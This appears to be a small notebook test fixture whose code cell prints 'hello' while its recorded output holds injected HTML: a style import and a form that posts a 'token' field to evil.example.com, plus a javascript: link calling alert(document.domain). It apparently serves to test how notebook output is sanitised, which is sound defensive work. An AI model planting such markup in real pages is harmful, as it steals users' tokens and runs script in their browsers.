# %%
# Normal code
print("hello")
# Out:
# <div id="test"><style>@import url(https://evil.example.com/track);</style><form action="https://evil.example.com/steal"><input name="token" value=""><button>Update</button></form></div>
# <a href="javascript:alert(document.domain)">Click for details</a>
